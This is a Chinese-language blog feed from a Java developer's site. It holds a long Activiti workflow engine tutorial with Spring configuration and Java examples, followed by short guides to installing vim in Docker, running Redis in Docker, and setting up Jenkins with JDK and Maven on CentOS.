http://www.springframework.org/schema/context/spring-context-3.1.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.1.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-3.1.xsd &quot;&gt; &lt;!-- 工作流引擎配置bean --&gt; &lt;bean id=&quot;processEngineConfiguration&quot; class=&quot;org.activiti.spring.SpringProcessEngineConfiguration&quot;&gt; &lt;!-- 数据源 --&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt; &lt;!-- 使用spring事务管理器 --&gt; &lt;property name=&quot;transactionManager&quot; ref=&quot;transactionManager&quot; /&gt; &lt;!-- 数据库策略 --&gt; &lt;property name=&quot;databaseSchemaUpdate&quot; value=&quot;drop-create&quot; /&gt; &lt;!-- activiti的定时任务关闭 --&gt; &lt;property name=&quot;jobExecutorActivate&quot; value=&quot;false&quot; /&gt; &lt;/bean&gt; &lt;!-- 流程引擎 --&gt; &lt;bean id=&quot;processEngine&quot; class=&quot;org.activiti.spring.ProcessEngineFactoryBean&quot;&gt; &lt;property name=&quot;processEngineConfiguration&quot; ref=&quot;processEngineConfiguration&quot; /&gt; &lt;/bean&gt; &lt;!-- 资源服务service --&gt; &lt;bean id=&quot;repositoryService&quot; factory-bean=&quot;processEngine&quot; factory-method=&quot;getRepositoryService&quot; /&gt; &lt;!-- 流程运行service --&gt; &lt;bean id=&quot;runtimeService&quot; factory-bean=&quot;processEngine&quot; factory-method=&quot;getRuntimeService&quot; /&gt; &lt;!-- 任务管理service --&gt; &lt;bean id=&quot;taskService&quot; factory-bean=&quot;processEngine&quot; factory-method=&quot;getTaskService&quot; /&gt; &lt;!-- 历史管理service --&gt; &lt;bean id=&quot;historyService&quot; factory-bean=&quot;processEngine&quot; factory-method=&quot;getHistoryService&quot; /&gt; &lt;!-- 用户管理service --&gt; &lt;bean id=&quot;identityService&quot; factory-bean=&quot;processEngine&quot; factory-method=&quot;getIdentityService&quot; /&gt; &lt;!-- 引擎管理service --&gt; &lt;bean id=&quot;managementService&quot; factory-bean=&quot;processEngine&quot; factory-method=&quot;getManagementService&quot; /&gt; &lt;!-- 数据源 --&gt; &lt;bean id=&quot;dataSource&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot;&gt; &lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/activiti&quot; /&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot; /&gt; &lt;property name=&quot;password&quot; value=&quot;mysql&quot; /&gt; &lt;property name=&quot;maxActive&quot; value=&quot;3&quot; /&gt; &lt;property name=&quot;maxIdle&quot; value=&quot;1&quot; /&gt; &lt;/bean&gt; &lt;!-- 事务管理器 --&gt; &lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt; &lt;/bean&gt; &lt;!-- 通知 --&gt; &lt;tx:advice id=&quot;txAdvice&quot; transaction-manager=&quot;transactionManager&quot;&gt; &lt;tx:attributes&gt;&lt;/tx:attributes&gt; &lt;!-- 传播行为 --&gt; &lt;tx:method name=&quot;save*&quot; propagation=&quot;REQUIRED&quot; /&gt; &lt;tx:method name=&quot;insert*&quot; propagation=&quot;REQUIRED&quot; /&gt; &lt;tx:method name=&quot;delete*&quot; propagation=&quot;REQUIRED&quot; /&gt; &lt;tx:method name=&quot;update*&quot; propagation=&quot;REQUIRED&quot; /&gt; &lt;tx:method name=&quot;find*&quot; propagation=&quot;SUPPORTS&quot; read-only=&quot;true&quot; /&gt; &lt;tx:method name=&quot;get*&quot; propagation=&quot;SUPPORTS&quot; read-only=&quot;true&quot; /&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;!-- 切面，根据具体项目修改切点配置 --&gt; &lt;aop:config proxy-target-class=&quot;true&quot;&gt; &lt;aop:advisor advice-ref=&quot;txAdvice&quot; pointcut=&quot;execution(* com.itheima.ihrm.service.impl.*.(..))&quot;* /&gt; &lt;/aop:config&gt;&lt;/beans&gt; 创建 processEngineConfiguration 1ProcessEngineConfiguration configuration = ProcessEngineConfiguration.createProcessEngineConfigurationFromResource(&quot;activiti.cfg.xml&quot;) 上边的代码要求 activiti.cfg.xml 中必须有一个 processEngineConfiguration 的 bean 也可以使用下边的方法，更改 bean 的名字： 1ProcessEngineConfiguration.createProcessEngineConfigurationFromResource(String resource, String beanName); # 4.4 工作流引擎创建 工作流引擎（ProcessEngine），相当于一个门面接口，通过 ProcessEngineConfiguration 创建 processEngine ，通过 ProcessEngine 创建各个 service 接口。 # 4.4.1 默认创建方式 将 activiti.cfg.xml 文件名及路径固定，且 activiti.cfg.xml 文件中有 processEngineConfiguration 的配置， 可以使用如下代码创建 processEngine : 123//直接使用工具类 ProcessEngines，使用classpath下的activiti.cfg.xml中的配置创建processEngineProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();System.out.println(processEngine); # 4.4.2 一般创建方式 1234//先构建ProcessEngineConfigurationProcessEngineConfiguration configuration = ProcessEngineConfiguration.createProcessEngineConfigurationFromResource(&quot;activiti.cfg.xml&quot;);//通过ProcessEngineConfiguration创建ProcessEngine，此时会创建数据库ProcessEngine processEngine = configuration.buildProcessEngine(); # 4.5 Servcie 服务接口 Service 是工作流引擎提供用于进行工作流部署、执行、管理的服务接口，我们使用这些接口可以就是操作服务对应的数据表 4.5.1 Service 创建方式 通过 ProcessEngine 创建 Service 方式如下： 123RuntimeService runtimeService = processEngine.getRuntimeService();RepositoryService repositoryService = processEngine.getRepositoryService();TaskService taskService = processEngine.getTaskService(); 4.5.2 Service 总览 简单介绍： RepositoryService 是 activiti 的资源管理类，提供了管理和控制流程发布包和流程定义的操作。使用工作流建模工具设计的业务流程图需要使用此 service 将流程定义文件的内容部署到计算机。 除了部署流程定义以外还可以：查询引擎中的发布包和流程定义。 暂停或激活发布包，对应全部和特定流程定义。暂停意味着它们不能再执行任何操作了，激活是对应的反向操作。获得多种资源，像是包含在发布包里的文件， 或引擎自动生成的流程图。 获得流程定义的 pojo 版本， 可以用来通过 java 解析流程，而不必通过 xml。 RuntimeService Activiti 的流程运行管理类。可以从这个服务类中获取很多关于流程执行相关的信息 TaskService Activiti 的任务管理类。可以从这个类中获取任务的信息。 HistoryService Activiti 的历史管理类，可以查询历史信息，执行流程时，引擎会保存很多数据（根据配置），比如流程实例启动时间，任务的参与者， 完成任务的时间，每个流程实例的执行路径，等等。这个服务主要通过查询功能来获得这些数据。 ManagementService Activiti 的引擎管理类，提供了对 Activiti 流程引擎的管理和维护功能，这些功能不在工作流驱动的应用程序中使用，主要用于 Activiti 系统的日常维护。 # 五、Activiti 入门 在本章内容中，我们来创建一个 Activiti 工作流，并启动这个流程。 创建 Activiti 工作流主要包含以下几步： 定义流程，按照 BPMN 的规范，使用流程定义工具，用流程符号把整个流程描述出来 部署流程，把画好的流程定义文件，加载到数据库中，生成表的数据 启动流程，使用 java 代码来操作数据库表中的内容 # 5.1 流程符号 BPMN 2.0 是业务流程建模符号 2.0 的缩写。 它由 Business Process Management Initiative 这个非营利协会创建并不断发展。作为一种标识，BPMN 2.0 是使用一些符号来明确业务流程设计流程图的一整套符号规范，它能增进业务建模时的沟通效率。 目前 BPMN2.0 是最新的版本，它用于在 BPM 上下文中进行布局和可视化的沟通。 接下来我们先来了解在流程设计中常见的 符号。 BPMN2.0 的基本符合主要包含： # 事件 Event # 活动 Activity 活动是工作或任务的一个通用术语。一个活动可以是一个任务，还可以是一个当前流程的子处理流程；其次，你还可以为活动指定不同的类型。常见活动如下： # 网关 GateWay 网关用来处理决策，有几种常用网关需要了解： 排他网关 (x) —— 只有一条路径会被选择。流程执行到该网关时，按照输出流的顺序逐个计算，当条件的计算结果为 true 时，继续执行当前网关的输出流； 如果多条线路计算结果都是 true，则会执行第一个值为 true 的线路。如果所有网关计算结果没有 true，则引擎会抛出异常。 排他网关需要和条件顺序流结合使用，default 属性指定默认顺序流，当所有的条件不满足时会执行默认顺序流。 并行网关 (+) —— 所有路径会被同时选择 拆分 —— 并行执行所有输出顺序流，为每一条顺序流创建一个并行执行线路。 合并 —— 所有从并行网关拆分并执行完成的线路均在此等候，直到所有的线路都执行完成才继续向下执行。 包容网关 (+) —— 可以同时执行多条线路，也可以在网关上设置条件 拆分 —— 计算每条线路上的表达式，当表达式计算结果为 true 时，创建一个并行线路并继续执行 合并 —— 所有从并行网关拆分并执行完成的线路均在此等候，直到所有的线路都执行完成才继续向下执行。 事件网关 (+) —— 专门为中间捕获事件设置的，允许设置多个输出流指向多个不同的中间捕获事件。当流程执行到事件网关后，流程处于等待状态，需要等待抛出事件才能将等待状态转换为活动状态。 # 流向 Flow 流是连接两个流程节点的连线。常见的流向包含以下几种： # 5.2 流程设计器使用 # Activiti-Designer 使用 # Palette（画板） 在 idea 中安装插件即可使用，画板中包括以下结点： Connection— 连接 Event— 事件 Task— 任务 Gateway— 网关 Container— 容器 Boundary event— 边界事件 Intermediate event- - 中间事件 流程图设计完毕保存生成.bpmn 文件 # 新建流程 (IDEA 工具) 首先选中存放图形的目录 (选择 resources 下的 bpmn 目录)，点击菜单： New -&gt; BpmnFile ，如图： 弹出如下图所示框，输入 evection 表示 出差审批流程： 起完名字 evection 后（默认扩展名为 bpmn），就可以看到流程设计页面，如图所示： 左侧区域是绘图区，右侧区域是 palette 画板区域 鼠标先点击画板的元素即可在左侧绘图 # 绘制流程 使用滑板来绘制流程，通过从右侧把图标拖拽到左侧的画板，最终效果如下： # 指定流程定义 Key 流程定义 key 即流程定义的标识，通过 properties 视图查看流程的 key # 指定任务负责人 在 properties 视图指定每个任务结点的负责人，如：填写出差申请的负责人为 zhangsan 经理审批负责人为 jerry 总经理审批负责人为 jack 财务审批负责人为 rose # 六、流程操作 # 6.1 流程定义 # 概述 流程定义是线下按照 bpmn2.0 标准去描述 业务流程，通常使用 idea 中的插件对业务流程进行建模。IDEA 插件介绍：IDEA 值得推荐的十几款优秀插件，狂，拽，屌！ 使用 idea 下的 designer 设计器绘制流程，并会生成两个文件：.bpmn 和.png # .bpmn 文件 使用 activiti-desinger 设计业务流程，会生成.bpmn 文件，上面我们已经创建好了 bpmn 文件 BPMN 2.0 根节点是 definitions 节点。这个元素中，可以定义多个流程定义（不过我们建议每个文件只包含一个流程定义， 可以简化开发过程中的维护难度）。 注意，definitions 元素 最少也要包含 xmlns 和 targetNamespace 的声明。targetNamespace 可以是任意值，它用来对流程实例进行分类。 流程定义部分：定义了流程每个结点的描述及结点之间的流程流转。 流程布局定义：定义流程每个结点在流程图上的位置坐标等信息。 # 生成.png 图片文件 IDEA 工具中的操作方式 1、修改文件后缀为 xml 首先将 evection.bpmn 文件改名为 evection.xml，如下图： evection.xml 修改前的 bpmn 文件，效果如下： 2、使用 designer 设计器打开.xml 文件 在 evection.xml 文件上面，点右键并选择 Diagrams 菜单，再选择 Show BPMN2.0 Designer… 3、查看打开的文件 打开后，却出现乱码，如图： 4、解决中文乱码 1、打开 Settings，找到 File Encodings，把 encoding 的选项都选择 UTF-8 2、打开 IDEA 安装路径，找到如下的安装目录 根据自己所安装的版本来决定，我使用的是 64 位的 idea，所以在 idea64.exe.vmoptions 文件的最后一行追加一条命令： -Dfile.encoding=UTF-8 如下所示： 一定注意，不要有空格，否则重启 IDEA 时会打不开，然后 重启 IDEA。 如果以上方法已经做完，还出现乱码，就再修改一个文件，并在文件的末尾添加： -Dfile.encoding=UTF-8 ，然后重启 idea，如图： 最后重新在 evection.xml 文件上面，点右键并选择 Diagrams 菜单，再选择 Show BPMN2.0 Designer… ，看到生成图片，如图： 到此，解决乱码问题 # 5、导出为图片文件 点击 Export To File 的小图标，打开如下窗口，注意填写文件名及扩展名，选择好保存图片的位置： 然后，我们把 png 文件拷贝到 resources 下的 bpmn 目录，并且把 evection.xml 改名为 evection.bpmn。 # 6.2 流程定义部署 # 概述 将上面在设计器中定义的流程部署到 activiti 数据库中，就是流程定义部署。 通过调用 activiti 的 api 将流程定义的 bpmn 和 png 两个文件一个一个添加部署到 activiti 中，也可以将两个文件打成 zip 包进行部署。 # 单个文件部署方式 分别将 bpmn 文件和 png 图片文件部署。 123456789101112131415161718192021public class ActivitiDemo { /** * 部署流程定义 */ @Test public void testDeployment(){// 1、创建ProcessEngine ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 2、得到RepositoryService实例 RepositoryService repositoryService = processEngine.getRepositoryService();// 3、使用RepositoryService进行部署 Deployment deployment = repositoryService.createDeployment() .addClasspathResource(&quot;bpmn/evection.bpmn&quot;) // 添加bpmn资源 .addClasspathResource(&quot;bpmn/evection.png&quot;) // 添加png资源 .name(&quot;出差申请流程&quot;) .deploy();// 4、输出部署信息 System.out.println(&quot;流程部署id：&quot; + deployment.getId()); System.out.println(&quot;流程部署名称：&quot; + deployment.getName()); }} 执行此操作后 activiti 会将上边代码中指定的 bpm 文件和图片文件保存在 activiti 数据库。 # 压缩包部署方式 将 evection.bpmn 和 evection.png 压缩成 zip 包。 12345678910111213141516171819@Test public void deployProcessByZip() { // 定义zip输入流 InputStream inputStream = this .getClass() .getClassLoader() .getResourceAsStream( &quot;bpmn/evection.zip&quot;); ZipInputStream zipInputStream = new ZipInputStream(inputStream); // 获取repositoryService RepositoryService repositoryService = processEngine .getRepositoryService(); // 流程部署 Deployment deployment = repositoryService.createDeployment() .addZipInputStream(zipInputStream) .deploy(); System.out.println(&quot;流程部署id：&quot; + deployment.getId()); System.out.println(&quot;流程部署名称：&quot; + deployment.getName()); } 执行此操作后 activiti 会将上边代码中指定的 bpm 文件和图片文件保存在 activiti 数据库。 # 操作数据表 流程定义部署后操作 activiti 的 3 张表如下： act_re_deployment 流程定义部署表，每部署一次增加一条记录 act_re_procdef 流程定义表，部署每个新的流程定义都会在这张表中增加一条记录 act_ge_bytearray 流程资源表 接下来我们来看看，写入了什么数据： 1SELECT * FROM act_re_deployment #流程定义部署表，记录流程部署信息 结果： 1SELECT * FROM act_re_procdef #流程定义表，记录流程定义信息 结果： 注意，KEY 这个字段是用来唯一识别不同流程的关键字 1SELECT * FROM act_ge_bytearray #资源表 结果： 注意： act_re_deployment 和 act_re_procdef 一对多关系，一次部署在流程部署表生成一条记录，但一次部署可以部署多个流程定义，每个流程定义在流程定义表生成一条记录。每一个流程定义在 act_ge_bytearray 会存在两个资源记录，bpmn 和 png。 建议：一次部署一个流程，这样部署表和流程定义表是一对一有关系，方便读取流程部署及流程定义信息。 # 6.3 启动流程实例 流程定义部署在 activiti 后就可以通过工作流管理业务流程了，也就是说上边部署的出差申请流程可以使用了。 针对该流程，启动一个流程表示发起一个新的出差申请单，这就相当于 java 类与 java 对象的关系，类定义好后需要 new 创建一个对象使用，当然可以 new 多个对象。对于请出差申请流程，张三发起一个出差申请单需要启动一个流程实例，出差申请单发起一个出差单也需要启动一个流程实例。 代码如下： 1234567891011121314151617/** * 启动流程实例 */ @Test public void testStartProcess(){// 1、创建ProcessEngine ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 2、获取RunTimeService RuntimeService runtimeService = processEngine.getRuntimeService();// 3、根据流程定义Id启动流程 ProcessInstance processInstance = runtimeService .startProcessInstanceByKey(&quot;myEvection&quot;);// 输出内容 System.out.println(&quot;流程定义id：&quot; + processInstance.getProcessDefinitionId()); System.out.println(&quot;流程实例id：&quot; + processInstance.getId()); System.out.println(&quot;当前活动Id：&quot; + processInstance.getActivityId()); } 输出内容如下： 操作数据表 act_hi_actinst 流程实例执行历史 act_hi_identitylink 流程的参与用户历史信息 act_hi_procinst 流程实例历史信息 act_hi_taskinst 流程任务历史信息 act_ru_execution 流程执行信息 act_ru_identitylink 流程的参与用户信息 act_ru_task 任务信息 # 6.4 任务查询 流程启动后，任务的负责人就可以查询自己当前需要处理的任务，查询出来的任务都是该用户的待办任务。 12345678910111213141516171819202122232425/** * 查询当前个人待执行的任务 */ @Test public void testFindPersonalTaskList() {// 任务负责人 String assignee = &quot;zhangsan&quot;; ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 创建TaskService TaskService taskService = processEngine.getTaskService();// 根据流程key 和 任务负责人 查询任务 List&lt;Task&gt; list = taskService.createTaskQuery() .processDefinitionKey(&quot;myEvection&quot;) //流程Key .taskAssignee(assignee)//只查询该任务负责人的任务 .list(); for (Task task : list) { System.out.println(&quot;流程实例id：&quot; + task.getProcessInstanceId()); System.out.println(&quot;任务id：&quot; + task.getId()); System.out.println(&quot;任务负责人：&quot; + task.getAssignee()); System.out.println(&quot;任务名称：&quot; + task.getName()); } } 输出结果如下： 1234流程实例id：2501任务id：2505任务负责人：zhangsan任务名称：创建出差申请 # 6.5 流程任务处理 任务负责人查询待办任务，选择任务进行处理，完成任务。微信搜索公众号：Java 项目精选，回复：java 领取资料 。 123456789101112131415161718// 完成任务 @Test public void completTask(){// 获取引擎 ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 获取taskService TaskService taskService = processEngine.getTaskService(); // 根据流程key 和 任务的负责人 查询任务// 返回一个任务对象 Task task = taskService.createTaskQuery() .processDefinitionKey(&quot;myEvection&quot;) //流程Key .taskAssignee(&quot;zhangsan&quot;) //要查询的负责人 .singleResult(); // 完成任务,参数：任务id taskService.complete(task.getId()); } # 6.6 流程定义信息查询 查询流程相关信息，包含流程定义，流程部署，流程定义版本 123456789101112131415161718192021222324252627282930/** * 查询流程定义 */ @Test public void queryProcessDefinition(){ // 获取引擎 ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// repositoryService RepositoryService repositoryService = processEngine.getRepositoryService();// 得到ProcessDefinitionQuery 对象 ProcessDefinitionQuery processDefinitionQuery = repositoryService.createProcessDefinitionQuery();// 查询出当前所有的流程定义// 条件：processDefinitionKey =evection// orderByProcessDefinitionVersion 按照版本排序// desc倒叙// list 返回集合 List&lt;ProcessDefinition&gt; definitionList = processDefinitionQuery.processDefinitionKey(&quot;myEvection&quot;) .orderByProcessDefinitionVersion() .desc() .list();// 输出流程定义信息 for (ProcessDefinition processDefinition : definitionList) { System.out.println(&quot;流程定义 id=&quot;+processDefinition.getId()); System.out.println(&quot;流程定义 name=&quot;+processDefinition.getName()); System.out.println(&quot;流程定义 key=&quot;+processDefinition.getKey()); System.out.println(&quot;流程定义 Version=&quot;+processDefinition.getVersion()); System.out.println(&quot;流程部署ID =&quot;+processDefinition.getDeploymentId()); } } 输出结果： 1234流程定义id：myEvection:1:4流程定义名称：出差申请单流程定义key：myEvection流程定义版本：1 # 6.7 流程删除 12345678910111213public void deleteDeployment() { // 流程部署id String deploymentId = &quot;1&quot;; ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine(); // 通过流程引擎获取repositoryService RepositoryService repositoryService = processEngine .getRepositoryService(); //删除流程定义，如果该流程定义已有流程实例启动则删除时出错 repositoryService.deleteDeployment(deploymentId); //设置true 级联删除流程定义，即使该流程有流程实例启动也可以删除，设置为false非级别删除方式，如果流程 //repositoryService.deleteDeployment(deploymentId, true); } 说明： 使用 repositoryService 删除流程定义，历史表信息不会被删除 如果该流程定义下没有正在运行的流程，则可以用普通删除。 如果该流程定义下存在已经运行的流程，使用普通删除报错，可用级联删除方法将流程及相关记录全部删除。 先删除没有完成流程节点，最后就可以完全删除流程定义信息 项目开发中级联删除操作一般只开放给超级管理员使用. # 6.8 流程资源下载 现在我们的流程资源文件已经上传到数据库了，如果其他用户想要查看这些资源文件，可以从数据库中把资源文件下载到本地。 解决方案有： jdbc 对 blob 类型，clob 类型数据读取出来，保存到文件目录 使用 activiti 的 api 来实现 使用 commons-io.jar 解决 IO 的操作 引入 commons-io 依赖包 12345&lt;dependency&gt; &lt;groupId&gt;commons-io&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;2.6&lt;/version&gt;&lt;/dependency&gt; 通过流程定义对象获取流程定义资源，获取 bpmn 和 png 1234567891011121314151617181920212223242526272829303132333435363738394041424344import org.apache.commons.io.IOUtils; @Test public void deleteDeployment(){// 获取引擎 ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 获取repositoryService RepositoryService repositoryService = processEngine.getRepositoryService();// 根据部署id 删除部署信息,如果想要级联删除，可以添加第二个参数，true repositoryService.deleteDeployment(&quot;1&quot;); } public void queryBpmnFile() throws IOException {// 1、得到引擎 ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 2、获取repositoryService RepositoryService repositoryService = processEngine.getRepositoryService();// 3、得到查询器：ProcessDefinitionQuery，设置查询条件,得到想要的流程定义 ProcessDefinition processDefinition = repositoryService.createProcessDefinitionQuery() .processDefinitionKey(&quot;myEvection&quot;) .singleResult();// 4、通过流程定义信息，得到部署ID String deploymentId = processDefinition.getDeploymentId();// 5、通过repositoryService的方法，实现读取图片信息和bpmn信息// png图片的流 InputStream pngInput = repositoryService.getResourceAsStream(deploymentId, processDefinition.getDiagramResourceName());// bpmn文件的流 InputStream bpmnInput = repositoryService.getResourceAsStream(deploymentId, processDefinition.getResourceName());// 6、构造OutputStream流 File file_png = new File(&quot;d:/evectionflow01.png&quot;); File file_bpmn = new File(&quot;d:/evectionflow01.bpmn&quot;); FileOutputStream bpmnOut = new FileOutputStream(file_bpmn); FileOutputStream pngOut = new FileOutputStream(file_png);// 7、输入流，输出流的转换 IOUtils.copy(pngInput,pngOut); IOUtils.copy(bpmnInput,bpmnOut);// 8、关闭流 pngOut.close(); bpmnOut.close(); pngInput.close(); bpmnInput.close(); } 说明： deploymentId 为流程部署 ID resource_name 为 act_ge_bytearray 表中 NAME_列的值 使用 repositoryService 的 getDeploymentResourceNames 方法可以获取指定部署下得所有文件的名称 使用 repositoryService 的 getResourceAsStream 方法传入部署 ID 和资源图片名称可以获取部署下指定名称文件的输入流 最后的将输入流中的图片资源进行输出。 # 6.9 流程历史信息的查看 即使流程定义已经删除了，流程执行的历史信息通过前面的分析，依然保存在 activiti 的 act_hi_* 相关的表中。所以我们还是可以查询流程执行的历史信息，可以通过 HistoryService 来查看相关的历史记录。 1234567891011121314151617181920212223242526272829/** * 查看历史信息 */ @Test public void findHistoryInfo(){// 获取引擎 ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();// 获取HistoryService HistoryService historyService = processEngine.getHistoryService();// 获取 actinst表的查询对象 HistoricActivityInstanceQuery instanceQuery = historyService.createHistoricActivityInstanceQuery();// 查询 actinst表，条件：根据 InstanceId 查询// instanceQuery.processInstanceId(&quot;2501&quot;);// 查询 actinst表，条件：根据 DefinitionId 查询 instanceQuery.processDefinitionId(&quot;myEvection:1:4&quot;);// 增加排序操作,orderByHistoricActivityInstanceStartTime 根据开始时间排序 asc 升序 instanceQuery.orderByHistoricActivityInstanceStartTime().asc();// 查询所有内容 List&lt;HistoricActivityInstance&gt; activityInstanceList = instanceQuery.list();// 输出 for (HistoricActivityInstance hi : activityInstanceList) { System.out.println(hi.getActivityId()); System.out.println(hi.getActivityName()); System.out.println(hi.getProcessDefinitionId()); System.out.println(hi.getProcessInstanceId()); System.out.println(&quot;&lt;==========================&gt;&quot;); } } # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/10/14/%E3%80%90Activiti%E3%80%91%E5%B7%A5%E4%BD%9C%E6%B5%81%E5%BC%95%E6%93%8E%20Activiti%20%E6%95%99%E7%A8%8B%EF%BC%88%E9%9D%9E%E5%B8%B8%E8%AF%A6%E7%BB%86%EF%BC%89/"},{"title":"Docker环境下安装vim","text":"# Docker 环境下安装 vim 在使用 docker 容器时，容器一般没有安装 vim，就需要安装 vim apt-get install vim 命令用于安装 vim，但是下载过慢。 第一步 配置国内镜像源 进入某个容器 例如进入 mysql 1docker exec -it mysql /bin/bash 第二步：更新源 1apt update 第三步安装 vim 1apt-get install vim # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/06/17/%E3%80%90Docker%E3%80%91Docker%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%AE%89%E8%A3%85vim/"},{"title":"Docker环境部署Reids镜像作为从节点","text":"# Docker 环境部署 Reids 镜像作为从节点 1234567891011121314# 拉取镜像docker pull redis# 配置文件本地：/mydata/redis/data/redis.conf 提前准备好主要配置bind 127.0.0.1 #注释掉这部分，使redis可以外部访问daemonize no#用守护线程的方式启动requirepass 你的密码#给redis设置密码appendonly yes#redis持久化 默认是notcp-keepalive 300 #防止出现远程主机强迫关闭了一个现有的连接的错误 默认是300# 创建实例并启动docker run -p 6380:6379 --name redis -v /mydata/redis/data/redis.conf:/etc/redis/redis.conf -v /mydata/redis/data:/data -d redis redis-server /etc/redis/redis.conf --appendonly yes # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/05/11/%E3%80%90Docker%E3%80%91Docker%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2Reids%E9%95%9C%E5%83%8F%E4%BD%9C%E4%B8%BA%E4%BB%8E%E8%8A%82%E7%82%B9/"},{"title":"Docker安装Jenkins","text":"# Docker 安装 Jenkins # 一、前言 # 1、领头羊 1作为领先的开源自动化服务器，Jenkins 提供了数百个插件来支持构建、部署和自动化任何项目。 # 2、特点 持续集成和持续交付：作为可扩展的自动化服务器，Jenkins 可以用作简单的 CI 服务器或变成任何项目的持续交付中心。 简易安装：Jenkins 是一个独立的基于 Java 的程序，可以开箱即用，包含适用于 Windows、Linux、macOS 和其他类 Unix 操作系统的软件包。 易于配置：Jenkins 可以通过其 Web 界面轻松设置和配置，其中包括即时错误检查和内置帮助。 插件：凭借更新中心的数百个插件，Jenkins 与持续集成和持续交付工具链中的几乎所有工具集成。 可扩展：Jenkins 可以通过其插件架构进行扩展，为 Jenkins 可以做的事情提供几乎无限的可能性。 分散式：Jenkins 可以轻松地在多台机器上分配工作，帮助更快地跨多个平台推动构建、测试和部署。 # 二、Docker 安装 Jenkins # 1、docker search jenkins 查询镜像 # 1.1、正常查询结果 1234567891011121314151617181920212223242526272829[root@localhost ~]# docker search jenkinsNAME DESCRIPTION STARS OFFICIAL AUTOMATEDjenkins DEPRECATED; use &quot;jenkins/jenkins:lts&quot; instead 5504 [OK] jenkins/jenkins The leading open source automation server 3087 jenkins/jnlp-slave a Jenkins agent which can connect to Jenkins… 150 [OK]jenkins/inbound-agent 65 bitnami/jenkins Bitnami Docker Image for Jenkins 53 [OK]jenkins/slave base image for a Jenkins Agent, which includ… 48 [OK]jenkins/agent 39 jenkins/ssh-slave A Jenkins slave using SSH to establish conne… 38 [OK]jenkins/ssh-agent Docker image for Jenkins agents connected ov… 24 jenkins/jnlp-agent-docker 8 jenkins/jnlp-agent-maven A JNLP-based agent with Maven 3 built in 7 jenkins/pct Plugin Compat Tester 5 [OK]jenkins/jenkins-experimental Experimental images of Jenkins. These images… 3 [OK]jenkins/jnlp-agent-python A JNLP-based agent with Python built in 3 jenkins/jnlp-agent-alpine 2 jenkins/jnlp-agent-node 1 rancher/jenkins-jenkins 1 jenkins/ath Jenkins Acceptance Test Harness 1 [OK]jenkins/core-changelog-generator Tool for generating Jenkins core changelogs 1 jenkins/jenkinsfile-runner Jenkinsfile Runner packages 1 jenkins/core-pr-tester Docker image for testing pull-requests sent … 1 jenkins/jnlp-agent-ruby 1 jenkins/remoting-kafka-agent Remoting Kafka Agent 1 [OK]rancher/jenkins-jnlp-slave 0 rancher/jenkins-slave Jenkins Build Slave 0 [OK][root@localhost ~]# ^C[root@localhost ~]# # 1.2、可能异常情况，这个异常解决方法为下面第 2 点 # 2、上面报这个 ERROR 解决方法 # 2.1、更新时间同步即可：ntpdate cn.pool.ntp.org # 2.2、如果提示不存在 ntpdate 命令需要先安装该命令：yum install ntpdate # 2.3、date 中国时间 # 3、****docker pull jenkinsci/blueocean**** 拉取 Jenkins 镜像 # 4、docker images 查看本地镜像 # 5、CentOS7 安装 JDK 安装 已有 JDK 可以跳过 # 5.1、可以下载 linux 版本 tar.gz 压缩包到本地不用解压 # 5.2、****cd /usr, mkdir java**** 进入 usr 创建 java 文件夹 # 5.3、****cd java* 进入 java 文件夹，用 * rz**** 将 linux 版的 jdk 压缩包上传到这里 # 5.4、(将 JDK 移到 java，mv jdk-8u301-linux-x64.tar.gz/usr/java) 移动文件命令 # 5.5、*tar* *-**zxvf* jdk-8u301-linux-x64.tar.gz，解压会有 jdk1.8.0_301 出现 # 5.6、****vi /etc/profile**** 配置 linux 系统 JDK 环境变量 1) 配置内容 12export JAVA_HOME=/usr/java/jdk1.8.0_301export JRE_HOME=${JAVA_HOME}/jre # 5.7、****source /etc/profile**** 使配置生效 # 5.8、*sudo yum install glibc.i686*，可能报错解决方案、否则会会报找不到 # 5.9、****java -version**** 测试，出现如下即为成功 # 6、CentOS7 安装 Maven # 6.1、*cd /usr/local* # 6.2、****rz* 上传，*tar -zxvf apache-maven-3.6.1-bin.tar.gz**** 解压 # 6.3、*vi /etc/profile* # 6.4、****source /etc/profile**** 刷新环境变量 # 6.5、****mvn -v**** 查看版本 1234567[root@localhost local]# mvn -vApache Maven 3.6.3 (cecedd343002696d0abb50b32b541b8a6ba2883f)Maven home: /usr/local/apache-maven-3.6.3Java version: 1.8.0_301, vendor: Oracle 